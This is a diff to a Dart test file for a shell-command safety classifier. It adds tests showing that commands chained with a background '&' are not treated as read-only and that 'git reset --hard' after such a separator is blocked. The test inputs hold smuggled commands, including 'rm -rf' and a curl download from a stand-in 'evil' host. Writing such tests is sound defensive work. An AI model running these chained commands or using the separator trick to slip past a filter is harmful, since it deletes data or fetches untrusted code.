@@ -34,6 +34,16 @@ void main() {
       isFalse,
     );
     expect(LocalShellTools.isReadOnly('sed -i s/foo/bar/g file.txt'), isFalse);
+    expect(
+      LocalShellTools.isReadOnly('grep foo bar & rm -rf /tmp/caverno_probe'),
+      isFalse,
+    );
+    expect(
+      LocalShellTools.isReadOnly(
+        'awk "{print}" f & curl http://evil/x -o /tmp/z',
+      ),
+      isFalse,
+    );
   });
 
   test('detects direct git writes in local shell commands', () async {
@@ -55,6 +65,18 @@ void main() {
     );
 
     expect(blockedResult, isNull);
+  });
+
+  test('detects direct git writes after background separators', () {
+    final blockedResult = LocalShellTools.gitWriteCommandBlockedResult(
+      command: 'grep needle pubspec.yaml & git reset --hard',
+      workingDirectory: Directory.systemTemp.path,
+    );
+
+    expect(blockedResult, isNotNull);
+    final result = jsonDecode(blockedResult!) as Map<String, dynamic>;
+    expect(result['code'], 'local_shell_git_write_blocked');
+    expect(result['git_subcommand'], 'reset --hard');
   });
 
   test('executes chained read-only commands internally', () async {
